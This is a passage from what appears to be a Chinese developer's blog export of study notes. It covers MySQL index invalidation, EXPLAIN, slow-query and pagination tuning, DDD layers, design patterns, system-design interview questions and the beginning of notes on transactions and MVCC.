<h2 id="5-8-索引失效">5.8 索引失效</h2>
<ul class="lvl-0">
<li class="lvl-2">
<p>使用左或者左右<strong>模糊匹配</strong>的时候，也就是 <code>like %xx</code> 或者 <code>like %xx%</code>这两种方式都会造成索引失效；</p>
</li>
<li class="lvl-2">
<p>在查询条件中<strong>对索引使用函数</strong>，即对索引列做了<code>计算、函数、类型转换操作</code>，这些情况下都会造成索引失效；</p>
</li>
<li class="lvl-2">
<p>对索引进行<mark>表达式计算</mark></p>
</li>
<li class="lvl-2">
<p>联合索引要能正确使用需要遵循<mark>最左匹配原则</mark>，也就是按照最左优先的方式进行索引的匹配，否则就会导致索引失效。</p>
</li>
<li class="lvl-2">
<p>对索引<mark>隐式类型转换</mark>（索引字段是字符串类型，但是在条件查询中，输入的参数是整型）</p>
</li>
<li class="lvl-2">
<p>在 where 子句中使用 != 或 not in 或 &lt;&gt; 操作符</p>
</li>
<li class="lvl-2">
<p>在 WHERE 子句中，如果在 OR 前的条件列是索引列，而在 OR 后的条件列不是索引列，那么索引会失效。</p>
</li>
</ul>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">//对索引进行表达式计算</span><br><span class="line"><span class="keyword">EXPLAIN</span> <span class="keyword">select</span> * <span class="keyword">from</span> department <span class="keyword">where</span> dept_id+<span class="number">1</span>=<span class="number">10</span>;</span><br><span class="line"><span class="keyword">EXPLAIN</span> <span class="keyword">select</span> * <span class="keyword">from</span> department <span class="keyword">where</span> dept_id=<span class="number">11</span>;</span><br><span class="line"></span><br><span class="line">//对索引使用函数</span><br><span class="line"><span class="keyword">EXPLAIN</span> <span class="keyword">select</span> * <span class="keyword">from</span> department <span class="keyword">where</span> LENGTH(dept_name)=<span class="number">5</span>;</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> department <span class="keyword">add</span> key idx_name_length ((LENGTH(dept_name)));</span><br></pre></td></tr></table></figure>
<h3 id="5-8-1-隐式类型转换造成索引失效">5.8.1 隐式类型转换造成索引失效</h3>
<p>MySQL 在遇到字符串和数字比较的时候，会自动把<mark>字符串转为数字，然后再进行比较</mark>。如果字符串是索引列，而条件语句中的输入参数是数字的话，那么索引列会发生隐式类型转换，由于隐式类型转换是通过 CAST 函数实现的，等同于对索引列使用了函数，所以就会导致索引失效。</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>当操作符<strong>左右两边的数据类型不一致</strong>时，会发生<strong>隐式转换</strong>。</p>
</li>
<li class="lvl-2">
<p>当 where 查询操作符<strong>左边为数值类型</strong>时发生了隐式转换，那么对效率影响不大，但还是不推荐这么做。</p>
</li>
<li class="lvl-2">
<p>当 where 查询操作符<strong>左边为字符类型</strong>时发生了隐式转换，那么会导致索引失效，造成全表扫描效率极低。</p>
</li>
<li class="lvl-2">
<p>字符串转换为数值类型时，非数字开头的字符串会转化为<code>0</code>，以数字开头的字符串会截取从第一个字符到第一个非数字内容为止的值为转化结果。</p>
</li>
</ul>
<figure class="highlight axapta"><table><tr><td class="code"><pre><span class="line"><span class="comment">//date_str 是字符串，然而匹配的是整数类型，从而发生隐式转换</span></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> news <span class="keyword">where</span> date_str = <span class="number">201701</span></span><br></pre></td></tr></table></figure>
<h2 id="5-9-回表查询">5.9 回表查询</h2>
<p>回表查询是指在使用非聚集索引进行查询时，需要通过索引中的指针回到主键索引或者聚集索引中获取完整的数据行的过程。回表查询通常发生在以下场景中：</p>
<ol>
<li class="lvl-3">
<p>需要查询的字段不在非聚集索引中：当查询的字段不在非聚集索引中时，数据库引擎无法直接从索引中获取完整的数据行，而是需要通过回表操作到主键索引或聚集索引中获取完整的数据行。</p>
</li>
<li class="lvl-3">
<p>需要返回的数据超过了非聚集索引的覆盖索引能力：覆盖索引是指索引中包含了查询所需的所有字段，可以直接从索引中获取查询结果，而无需回表操作。但是，如果需要返回的数据超过了非聚集索引的覆盖索引能力，仍然需要进行回表查询。</p>
</li>
<li class="lvl-3">
<p>使用了索引优化的查询：有些查询语句可能会使用到索引优化，例如使用了索引的覆盖扫描、索引合并等技术，这些优化可能会导致回表查询的发生。</p>
</li>
</ol>
<p>回表查询会增加额外的IO操作，因为需要通过指针再次访问主键索引或聚集索引。在一些对查询性能要求较高的场景中，可以考虑使用覆盖索引或者调整查询语句的优化方式，以减少回表查询的次数。</p>
<p>回表查询并非一定是性能问题，有时候回表查询是必要的，特别是在需要返回完整数据行的情况下。在设计数据库表和索引时，需要根据具体的业务需求和查询场景来选择合适的索引策略，以达到最佳的查询性能。</p>
<h2 id="5-10-Count">5.10 Count</h2>
<p>count(1)、 count(*)、 count(主键字段)在执行的时候，如果表里存在二级索引，优化器就会选择二级索引进行扫描。</p>
<p>所以，如果要执行 count(1)、 count(*)、 count(主键字段) 时，尽量在数据表上建立二级索引，这样优化器会自动采用 key_len 最小的二级索引进行扫描，相比于扫描主键索引效率会高一些。</p>
<p>再来，就是不要使用 count(字段) 来统计记录个数，因为它的效率是最差的，会采用全表扫描的方式来统计。如果你非要统计表中该字段不为 NULL 的记录个数，建议给这个字段建立一个二级索引。</p>
<p>如果参数是 (<code>COUNT(*)</code>)，则会统计所有的记录数，包括 <code>NULL</code> 值；如果参数是某个字段名(<code>COUNT(列名)</code>)，则会忽略 <code>NULL</code> 值，只统计非空值的个数。</p>
<h1>6 执行计划（Explain)</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p>possible_keys 字段表示可能用到的索引；</p>
</li>
<li class="lvl-2">
<p>key 字段表示实际用的索引，如果这一项为 NULL，说明没有使用索引；</p>
</li>
<li class="lvl-2">
<p>key_len 表示索引的长度；</p>
</li>
<li class="lvl-2">
<p>rows 表示扫描的数据行数。</p>
</li>
<li class="lvl-2">
<p>type 表示<mark>数据扫描类型</mark>，我们需要重点看这个。</p>
</li>
</ul>
<h2 id="6-1-type">6.1 type</h2>
<ul class="lvl-0">
<li class="lvl-2">
<p>All（全表扫描）；</p>
</li>
<li class="lvl-2">
<p>index（全索引扫描）；</p>
</li>
<li class="lvl-2">
<p>range（索引范围扫描）；</p>
</li>
<li class="lvl-2">
<p>ref（非唯一索引扫描）；</p>
</li>
<li class="lvl-2">
<p>eq_ref（唯一索引扫描）；</p>
</li>
<li class="lvl-2">
<p>const（结果只有一条的主键或唯一索引扫描）。</p>
</li>
</ul>
<h2 id="6-2-extra">6.2 extra</h2>
<ul class="lvl-0">
<li class="lvl-2">
<p>Using filesort ：当查询语句中包含 group by 操作，而且无法利用索引完成排序操作的时候， 这时不得不选择相应的排序算法进行，甚至可能会通过文件排序，效率是很低的，所以要避免这种问题的出现。</p>
</li>
<li class="lvl-2">
<p>Using temporary：使了用临时表保存中间结果，MySQL 在对查询结果排序时使用临时表，常见于排序 order by 和分组查询 group by。效率低，要避免这种问题的出现。</p>
</li>
<li class="lvl-2">
<p>Using index：所需数据只需在索引即可全部获得，不须要再到表中取数据，也就是使用了覆盖索引，避免了回表操作，效率不错。</p>
</li>
</ul>
<h1>7 慢查询</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p>慢查询日志</p>
</li>
<li class="lvl-2">
<p><mark>分析查询语句</mark>：使用EXPLAIN命令分析SQL执行计划，找出慢查询的原因，比如是否使用了全表扫描，是否存在索引未被利用的情况等，并根据相应情况对索引进行适当修改。 (索引失效、覆盖索引)</p>
</li>
<li class="lvl-2">
<p><mark>创建或优化索引</mark>：根据查询条件创建合适的索引，特别是经常用于WHERE子句的字段、Orderby 排序的字段、Join 连表查询的字典、 group by的字段，并且如果查询中经常涉及多个字段，考虑创建联合索引，使用联合索引要符合最左匹配原则，不然会索引失效</p>
</li>
<li class="lvl-2">
<p><mark>避免索引失效</mark>：比如不要用左模糊匹配、函数计算、表达式计算等等。 查询优化：<code>避免使用SELECT *</code>，只查询真正需要的列；<code>使用覆盖索引</code>，即索引包含所有查询的字段；<code>联表查询最好要以小表驱动大表</code>，并且被驱动表的字段要有索引，当然最好通过冗余字段的设计，避免联表查询。</p>
</li>
<li class="lvl-2">
<p><mark>分页优化</mark>：针对 limit n,y 深分页的查询优化，可以把Limit查询转换成某个位置的查询：select * from tb_sku where id&gt;20000 limit 10，该方案适用于主键自增的表，</p>
</li>
<li class="lvl-2">
<p><mark>优化数据库表</mark>：如果单表的数据超过了千万级别，考虑是否需要将大表拆分为小表，减轻单个表的查询压力。也可以将字段多的表分解成多个表，有些字段使用频率高，有些低，数据量大时，会由于使用频率低的存在而变慢，可以考虑分开。 （分库分表）</p>
</li>
<li class="lvl-2">
<p><mark>使用缓存技术</mark>：引入缓存层，如Redis，存储热点数据和频繁查询的结果，但是要考虑缓存一致性的问题，对于读请求会选择旁路缓存策略，对于写请求会选择先更新 db，再删除缓存的策略。</p>
</li>
</ul>
<h2 id="7-1-深分页优化">7.1 深分页优化</h2>
<blockquote>
<p>limit偏移量太大，回表查询导致查询效率低</p>
</blockquote>
<p><code>select id,name,balance from account where update_time&gt; '2020-09-19' limit 100000,10;</code></p>
<ol>
<li class="lvl-3">
<p>通过<strong>普通二级索引树</strong>idx_update_time，过滤update_time条件，找到满足条件的记录ID。</p>
</li>
<li class="lvl-3">
<p>通过ID，回到<strong>主键索引树</strong>，找到满足记录的行，然后取出展示的列（<strong>回表</strong>）</p>
</li>
<li class="lvl-3">
<p>扫描满足条件的100010行，然后扔掉前100000行，返回。</p>
</li>
</ol>
<ul class="lvl-0">
<li class="lvl-2">
<p>子查询优化：查询满足条件的数据行，再走主键索引</p>
</li>
<li class="lvl-2">
<p>索引优化：覆盖索引</p>
</li>
<li class="lvl-2">
<p>INNER JOIN延迟关联：是把条件转移到主键索引树，然后减少回表</p>
</li>
<li class="lvl-2">
<p>标签记录法：记录上次查询的最后一条记录</p>
</li>
</ul>
<p><a href="https://cloud.tencent.com/developer/article/1884103">实战！聊聊如何解决MySQL深分页问题-腾讯云开发者社区-腾讯云 (tencent.com)</a></p>
<h1>8 参考</h1>
<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202404182127269.png" alt="image.png"></p>
]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title></title>
    <url>/2023/12/04/%E6%A1%86%E6%9E%B6/MVC%E5%92%8CDDD/</url>
    <content><![CDATA[<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202403112127671.png" alt="image.png"></p>
<ul class="lvl-0">
<li class="lvl-2">应用层{application}
<ul class="lvl-2">
<li class="lvl-6">应用服务位于应用层。用来表述应用和用户行为，负责服务的组合、编排和转发，负责处理业务用例的执行顺序以及结果的拼装。</li>
<li class="lvl-6">应用层的服务包括应用服务和领域事件相关服务。</li>
<li class="lvl-6">应用服务可对微服务内的领域服务以及微服务外的应用服务进行组合和编排，或者对基础层如文件、缓存等数据直接操作形成应用服务，对外提供粗粒度的服务。</li>
<li class="lvl-6">领域事件服务包括两类：领域事件的发布和订阅。通过事件总线和消息队列实现异步数据传输，实现微服务之间的解耦。</li>
</ul>
</li>
<li class="lvl-2">领域层{domain}
<ul class="lvl-2">
<li class="lvl-6">领域服务位于领域层，为完成领域中跨实体或值对象的操作转换而封装的服务，领域服务以与实体和值对象相同的方式参与实施过程。</li>
<li class="lvl-6">领域服务对同一个实体的一个或多个方法进行组合和封装，或对多个不同实体的操作进行组合或编排，对外暴露成领域服务。领域服务封装了核心的业务逻辑。实体自身的行为在实体类内部实现，向上封装成领域服务暴露。</li>
<li class="lvl-6">为隐藏领域层的业务逻辑实现，所有领域方法和服务等均须通过领域服务对外暴露。</li>
<li class="lvl-6">为实现微服务内聚合之间的解耦，原则上禁止跨聚合的领域服务调用和跨聚合的数据相互关联。</li>
</ul>
</li>
<li class="lvl-2">基础层{infrastructure}
<ul class="lvl-2">
<li class="lvl-6">基础服务位于基础层。为各层提供资源服务（如数据库、缓存等），实现各层的解耦，降低外部资源变化对业务逻辑的影响。</li>
<li class="lvl-6">基础服务主要为仓储服务，通过依赖反转的方式为各层提供基础资源服务，领域服务和应用服务调用仓储服务接口，利用仓储实现持久化数据对象或直接访问基础资源。</li>
</ul>
</li>
<li class="lvl-2">接口层{interfaces}
<ul class="lvl-2">
<li class="lvl-6">接口服务位于用户接口层，用于处理用户发送的Restful请求和解析用户输入的配置文件等，并将信息传递给应用层。<br>
<img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202403112131544.png" alt="image.png"></li>
</ul>
</li>
</ul>
]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2023/12/14/%E6%A1%86%E6%9E%B6/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/</url>
    <content><![CDATA[<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202405202116846.png" alt="image.png"></p>
<h1>1 创建型模式</h1>
<h2 id="1-1-单例模式">1.1 单例模式</h2>
<p>单例模式属于创建型模式，⼀个单例类在任何情况下都只存在⼀个实例，构造⽅法必须是私有的、由⾃⼰创建⼀个静态变量存储实例，对外提供⼀个静态公有⽅法获取实例。</p>
<h3 id="1-1-1-常见写法">1.1.1 常见写法</h3>
<ul class="lvl-0">
<li class="lvl-2">
<p>饿汉式</p>
</li>
<li class="lvl-2">
<p>懒加载(lazy loading)：使用的时候再创建对象</p>
</li>
</ul>
<p><strong>双重校验锁实现对象单例（线程安全）</strong>：</p>
<blockquote>
<p>这⾥的双重检查是指两次⾮空判断，锁指的是 synchronized 加锁，为什么要进⾏双重判断，其实很简单，第⼀重判断，如果实例已经存在，那么就不再需要进⾏同步操作，⽽是直接返回这个实例，如果没有创建，才会进⼊同步块，同步块的⽬的与之前相同，⽬的是为了防⽌有多个线程同时调⽤时，导致⽣成多个实例，有了同步块，每次只能有⼀个线程调⽤访问同步块内容，当第⼀个抢到锁的调⽤获取了实例之后，这个实例就会被创建，之后的所有调⽤都不会进⼊同步块，直接在第⼀重判断就返回了单例。关于内部的第⼆重空判断的作⽤，当多个线程⼀起到达锁位置时，进⾏锁竞争，其中⼀个线程获取锁，如果是第⼀次进⼊则为 null，会进⾏单例对象的创建，完成后释放锁，其他线程获取锁后就会被空判断拦截，直接返回已创建的单例对象。</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Singleton</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">volatile</span> <span class="keyword">static</span> Singleton uniqueInstance;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">Singleton</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span>  <span class="keyword">static</span> Singleton <span class="title function_">getUniqueInstance</span><span class="params">()</span> &#123;</span><br><span class="line">       <span class="comment">//先判断对象是否已经实例过，没有实例化过才进入加锁代码</span></span><br><span class="line">        <span class="keyword">if</span> (uniqueInstance == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">//类对象加锁</span></span><br><span class="line">            <span class="keyword">synchronized</span> (Singleton.class) &#123;</span><br><span class="line">                <span class="keyword">if</span> (uniqueInstance == <span class="literal">null</span>) &#123;</span><br><span class="line">                    uniqueInstance = <span class="keyword">new</span> <span class="title class_">Singleton</span>();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> uniqueInstance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>uniqueInstance</code> 采用 <code>volatile</code> 关键字修饰也是很有必要的， <code>uniqueInstance = new Singleton();</code> 这段代码其实是分为三步执行：</p>
<ol>
<li class="lvl-3">
<p>为 <code>uniqueInstance</code> 分配内存空间</p>
</li>
<li class="lvl-3">
<p>初始化 <code>uniqueInstance</code></p>
</li>
<li class="lvl-3">
<p>将 <code>uniqueInstance</code> 指向分配的内存地址</p>
</li>
</ol>
<h2 id="1-2-工厂模式">1.2 工厂模式</h2>
<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202405202119797.png" alt="image.png"></p>
<p>简单⼯⼚模式指由⼀个⼯⼚对象来创建实例，客户端不需要关注创建逻辑，只需提供传⼊⼯⼚的参数。</p>
<p>适⽤于⼯⼚类负责创建对象较少的情况，缺点是如果要增加新产品，就需要修改⼯⼚类的判断逻辑，违背开闭原则，且产品多的话会使⼯⼚类⽐较复杂。</p>
<h1>2 行为型模式</h1>
<h2 id="2-1-策略模式">2.1 策略模式</h2>
<blockquote>
<p>多种算法中替换</p>
</blockquote>
<p>策略模式属于行为模式的一种，一个类的行为或算法可以在运行时进行更改策略模式（Strategy Pattern）属于对象的⾏为模式。其⽤意是针对⼀组算法，将每⼀个算法封装到具有共同接⼝的独⽴的类中，从⽽使得它们可以相互替换。策略模式使得算法可以在不影响到客户端的情况下发⽣变化。其主要⽬的是通过定义相似的算法，替换 if else 语句写法，并且可以随时相互替换。</p>
<p>1、什么是策略模式?<br>
策略模式是一种行为型设计模式，它允许在运行时更改对象的行为。这种模式通过将算法与使用算法的代码解耦，提供了一种动态选择不同算法的方法。在本文中，我将介绍策略模式的原理、适用场景、技术要点以及以JAVA实现的案例代码。</p>
<p>2、原理介绍策略模式定义了一系列算法或策略，并将每个算法封装在独立的类中，使得它们可以互相替换。通过使用策略模式，可以在运行时根据需要选择不同的算法，而不需要修改客户端代码。在策略模式中，我们创建表示各种策略的对象和一个行为随着策略对象改变而改变的 context 对象。策略对象改变 context 对象的执行算法。</p>
]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2024/05/21/%E6%A1%86%E6%9E%B6/%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E3%80%81%E5%9C%BA%E6%99%AF%E9%A2%98/</url>
    <content><![CDATA[<h1>1 评论系统</h1>
<p>设计一个基于 Redis 的简单评论系统，需要支持发布评论、回复评论和分页展示。请描述你的数据结构和设计。</p>
<p>在设计一个评论系统中，你如何处理多级评论问题，如何设计数据结构？</p>
<p>追问：如何高效的查询和展示评论，你会采用什么样的算法或技术来优化查询性能？</p>
<h1>2 设计一个定时任务执行系统</h1>
<h1>3 库存超卖</h1>
<blockquote>
<p>[!note]<br>
高并发卖5000张券</p>
</blockquote>
<ul class="lvl-0">
<li class="lvl-2">
<p>Redis缓存扣减库存</p>
</li>
<li class="lvl-2">
<p>分布式锁+分段缓存：借鉴ConcurrenthashMap分段锁的机制，把100个商品，分在3个段上，key为分段名字，value为库存数量。用户下单时对用户id进行%3计算，看落在哪个redis的key上，就去取哪个。</p>
</li>
<li class="lvl-2">
<p>Redis原子操作(Redis incr)+乐观锁：</p>
</li>
<li class="lvl-2">
<p>stockCount记录库存总量，<code>stockUsedCount</code>记录已使用库存量，对占用的库存设置分布式锁</p>
</li>
</ul>
<p><a href="https://gitcode.net/KnowledgePlanet/Lottery/-/wikis/%E7%AC%AC-2-%E9%83%A8%E5%88%86-%E9%A2%86%E5%9F%9F%E5%BC%80%E5%8F%91//%E7%AC%AC19%E8%8A%82%EF%BC%9A%E8%AE%BE%E8%AE%A1%E6%BB%91%E5%8A%A8%E5%BA%93%E5%AD%98%E5%88%86%E5%B8%83%E5%BC%8F%E9%94%81%E5%A4%84%E7%90%86%E6%B4%BB%E5%8A%A8%E7%A7%92%E6%9D%80">第19节：设计滑动库存分布式锁处理活动秒杀 · Wiki · KnowledgePlanet / Lottery · GitCode</a><br>
<a href="https://developer.aliyun.com/article/1307527#:~:text=%E5%9C%A8%E9%AB%98%E5%B9%B6%E5%8F%91%E7%9A%84%E7%A7%92%E6%9D%80%E6%8A%A2">【并发】高并发下库存超卖问题如何解决？-阿里云开发者社区 (aliyun.com)</a><br>
<a href="https://zhuanlan.zhihu.com/p/368227333#:~:text=1%E3%80%81%E5%BA%93%E5%AD%98%E8%A1%A8.%20%E5%BD%93">万级并发！电商库存扣减如何设计，如何做到不超卖？ - 知乎 (zhihu.com)</a><br>
<a href="https://blog.csdn.net/E_N_T_J/article/details/104606606#:~:text=%E5%9C%A8%20%E5%B9%B6%E5%8F%91%20%E7%9A%84%E5%9C%BA%E6%99%AF">超卖问题及其解决方法-CSDN博客</a></p>
<h1>4 秒杀系统</h1>
<p>“秒杀”，就是在同一个时刻有大量请求争抢购买同一个商品，并完成交易的过程，其间涉及大量的并发读和并发写，并要求高可靠和高性能的系统支持。</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>高性能。</strong> 秒杀涉及大量的并发读和并发写，因此支持高并发访问这点非常关键。本专栏将从设计数据的动静分离方案、热点的发现与隔离、请求的削峰与分层过滤、服务端的极致优化这 4 个方面重点介绍。</p>
</li>
<li class="lvl-2">
<p><strong>一致性。</strong> 秒杀中商品减库存的实现方式同样关键。可想而知，有限数量的商品在同一时刻被很多倍的请求同时来减库存，减库存又分为“拍下减库存”“付款减库存”以及预扣等几种，在大并发更新的过程中都要保证数据的准确性，其难度可想而知。因此，我将用一篇文章来专门讲解如何设计秒杀减库存方案。</p>
</li>
<li class="lvl-2">
<p><strong>高可用。</strong> 虽然我介绍了很多极致的优化思路，但现实中总难免出现一些我们考虑不到的情况，所以要保证系统的高可用和正确性，我们还要设计一个 PlanB 来兜底，以便在最坏情况发生时仍然能够从容应对。专栏的最后，我将带你思考可以从哪些环节来设计兜底方案。</p>
</li>
<li class="lvl-2">
<p>过滤无效流量</p>
</li>
<li class="lvl-2">
<p>库存可以少卖不可以超卖</p>
</li>
<li class="lvl-2">
<p>热点商品预热</p>
</li>
<li class="lvl-2">
<p>热点商品信息提前缓存</p>
</li>
<li class="lvl-2">
<p>利用redis缓存</p>
</li>
<li class="lvl-2">
<p>静态资源提前加载</p>
</li>
<li class="lvl-2">
<p>利用消息队列进行流量削峰</p>
</li>
<li class="lvl-2">
<p>切片集群</p>
</li>
<li class="lvl-2">
<p>在用户发起请求前，对用户进行一些校验操作，比如答题、输入验证码</p>
</li>
<li class="lvl-2">
<p>服务限流</p>
</li>
</ul>
<p>过滤无效流量</p>
<p>将用户请求分散</p>
<p>提高QPS</p>
<p><a href="https://zhuanlan.zhihu.com/p/273302387">高频面试题：秒杀场景设计 - 知乎 (zhihu.com)</a><br>
<a href="https://cloud.tencent.com/developer/article/1833184">面试官问我：如何设计一个秒杀场景？-腾讯云开发者社区-腾讯云 (tencent.com)</a><br>
<a href="https://developer.aliyun.com/article/1325551">秒杀场景的设计思路和方案-阿里云开发者社区 (aliyun.com)</a><br>
<a href="https://zhuanlan.zhihu.com/p/433618121">万字超详解秒杀系统！ - 知乎 (zhihu.com)</a><br>
<a href="https://blog.csdn.net/lxw1844912514/article/details/119745812">面试必备：秒杀场景九个细节-CSDN博客</a></p>
<h1>5 商品点击率排行榜</h1>
<p>top K排序</p>
<blockquote>
<p>多并行优化</p>
</blockquote>
<p>多个top K排序，在合并求top K</p>
<blockquote>
<p>[!question] 全国的酒店价格（千万级数据）需要在某个瞬间比如7点发生变动（比如说晚上折扣或者升价之类的），怎样高性能准点去进行变更</p>
</blockquote>
<ul class="lvl-0">
<li class="lvl-2">
<p>定时消息+缓存提前预热</p>
</li>
<li class="lvl-2">
<p>提前计算缓存 定时切换Redis命名空间 然后异步做持久化(使用Hash数据结构，key为商家id，value为价格)</p>
</li>
</ul>
<blockquote>
<p>[!question] 外卖系统，一天一千万条数据，用户需要查到近30天的数据，商家也要查询到30天的数据，怎么设计表</p>
</blockquote>
<p>数据库冷热分离分库分表</p>
<h1>6 游戏开发</h1>
<p>1.以lol为例，玩家的匹配怎么做。</p>
<p>2.排行榜（其他面经有）。(Redis的zset数据结构)</p>
<p>3.范围技能命中判定。（其他面经有）。</p>
<p>1.饥荒里食物放置在地上隔段时间会有新鲜度的变化，从绿色到黄色到红色最终腐烂，如何设计算法使这个服务器每帧更新食物状态？<br>
我说饥荒联机版搞的是加个组件直接计时，结果就是太多堆积会很卡顿。单纯考虑算法的话整个单调栈，每次食物放地上就把它什么时间需要更新状态存进去，然后按时间读就行</p>
<blockquote>
<p>堆排序，取出一个元素后，为下一个元素设置定时器更新</p>
</blockquote>
<p>2.抽卡问题，n张卡给个排序要求随机？<br>
直接rand(1,n)取第一张index k然后把k和n位置换一下，接着rand(1,n-1)取第二张indexj ,j和n-1位置交换 依次类推</p>
<p>3.手榴弹爆炸范围，对二维空间内造成aoe伤害，怎么找影响的实体单位？<br>
不太会，后来说可以哈希</p>
<blockquote>
<p>从爆炸中心进行BFS找影响的单位</p>
</blockquote>
<p>问题1：系统设计（40min）<br>
设计一个长链接转换为短链接的转换？<br>
怎么进行转换？<br>
怎么存储？<br>
怎么设计给别人用的http的接口？<br>
设计这个系统的重点是什么，需要关注什么？<br>
长变短除了随机还有什么比较好的方式转化嘛？</p>
<p><a href="https://blog.csdn.net/mangomango123/article/details/119910256">长链接转成短链接的原理和实现详解_长链接转化成短链接-CSDN博客</a></p>
<p>问题2：java中多线程模型，给了一段代码让输出最终结果？多种情况（10min，这个很简单）</p>
<p>问题3：烧绳法计算15分钟（10min，脑子没转过来，原来可以两端烧）</p>
<p>1.一条公路上有多个点，每个点都有一辆车，给定公路坐标轴，车的速度和行驶方向，求最早两辆车相遇的时间；<br>
第一题：无论相向还是相反，最先相遇的必然会发生在相邻的两部车之间。时间=abs（两相邻点之间的距离差）/abs（速度差），速度差为零永远不会相遇，取最小值就行啦</p>
<p>2.一条直线上多个点运动 知道所有点的位置，和速度包括方向。当两个点相碰时，追及或对撞两个点消失，问什么时候达到稳定状态，也就是以后都不会发生碰撞。第二题可以用第一题的思路，首先消除最先相遇的两个点，去掉这两个点后，重新计算最先相遇的两个点…直到所有车无法相遇就达到平衡啦</p>
<p>可以用优先队列去存相遇时间，每次取最小的，消除之后，会新更新一条进去，用个特殊标记记录两个点不会相遇，比如MAXINT这种，也能处理特殊情况</p>
<p>第一个是矩阵里找最长路径问题<br>
第二个是直线上n个移动的点，求最早相遇时间</p>
]]></content>
  </entry>
  <entry>
    <title>MySQL(2)：事务</title>
    <url>/2024/04/02/%E6%95%B0%E6%8D%AE%E5%BA%93/MySQL(2)%EF%BC%9A%E4%BA%8B%E5%8A%A1/</url>
    <content><![CDATA[<h1>1 事务</h1>
<blockquote>
<p>数据库事务可以保证多个对数据库的操作（也就是 SQL 语句）构成一个逻辑上的整体。构成这个逻辑上的整体的这些数据库操作遵循：<strong>要么全部执行成功,要么全部不执行</strong> 。</p>
</blockquote>
<h2 id="1-1-ACID">1.1 ACID</h2>
<p><mark>原子性、隔离性、持久性（手段） =&gt; 一致性（目的）</mark></p>
<blockquote>
<p>原子性，隔离性和持久性是数据库的属性，而一致性（在 ACID 意义上）是应用程序的属性。</p>
</blockquote>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>原子性</strong>（<code>Atomicity</code>）：事务是最小的执行单位，不允许分割。事务的原子性确保动作要么全部完成，要么完全不起作用；</p>
</li>
<li class="lvl-2">
<p><strong>一致性</strong>（<code>Consistency</code>）：是指事务操作前和操作后，数据满足完整性约束，数据库保持一致性状态。数据库总是从一个一致性的状态转换到另外一个一致性的状态。例如转账业务中，无论事务是否成功，转账者和收款人的总额应该是不变的；</p>
</li>
<li class="lvl-2">
<p><strong>隔离性</strong>（<code>Isolation</code>）：一个事务所做的修改在最终提交以前，对其他事务是不可见的。保证事务在不受外部并发操作影响的“独立”环境执行。这意味着事务处理过程中的中间状态对外部是不可见的,数据库允许多个并发事务同时对其数据进行读写和修改的能力，隔离性可以防止多个事务并发执行时由于交叉执行而导致数据的不一致，因为多个事务同时使用相同的数据时，不会相互干扰，每个事务都有一个完整的数据空间，对其他并发事务是隔离的。</p>
</li>
<li class="lvl-2">
<p><strong>持久性</strong>（<code>Durability</code>）：一旦事务提交，则其所做的修改就会永久保存到数据库中。此时即使系统崩溃，修改的数据也不会丢失。</p>
</li>
</ul>
<blockquote>
<p>[!note] InnoDB 引擎通过什么技术来保证事务的这四个特性的呢？</p>
</blockquote>
<ul class="lvl-0">
<li class="lvl-2">
<p>持久性是通过 redo log （重做日志）来保证的；</p>
</li>
<li class="lvl-2">
<p>原子性是通过 undo log（回滚日志） 来保证的；</p>
</li>
<li class="lvl-2">
<p>隔离性是通过 MVCC（多版本并发控制） 或锁机制来保证的；</p>
</li>
<li class="lvl-2">
<p>一致性则是通过持久性+原子性+隔离性来保证；</p>
</li>
</ul>
<h2 id="1-2-并发事务控制方式">1.2 并发事务控制方式</h2>
<p>MySQL 中并发事务的控制方式无非就两种：<strong>锁</strong> 和 <strong>MVCC</strong>。锁可以看作是悲观控制的模式，多版本并发控制（MVCC，Multiversion concurrency control）可以看作是乐观控制的模式。</p>
<p><strong>锁</strong> 控制方式下会通过锁来显式控制共享资源而不是通过调度手段，MySQL 中主要是通过 <strong>读写锁</strong> 来实现并发控制。</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>共享锁（S 锁）</strong>：又称读锁，事务在读取记录的时候获取共享锁，允许多个事务同时获取（锁兼容）。</p>
</li>
<li class="lvl-2">
<p><strong>排他锁（X 锁）</strong>：又称写锁/独占锁，事务在修改记录的时候获取排他锁，不允许多个事务同时获取。如果一个记录已经被加了排他锁，那其他事务不能再对这条记录加任何类型的锁（锁不兼容）。</p>
</li>
</ul>
<p><strong>MVCC</strong> 是多版本并发控制方法，即对一份数据会存储多个版本，通过事务的可见性来保证事务能看到自己应该看到的版本。通常会有一个全局的版本分配器来为每一行数据设置版本号，版本号是唯一的。</p>
<p>MVCC 在 MySQL 中实现所依赖的手段主要是: <strong>隐藏字段、read view、undo log</strong>。</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>undo log : undo log 用于记录某行数据的多个版本的数据。</p>
</li>
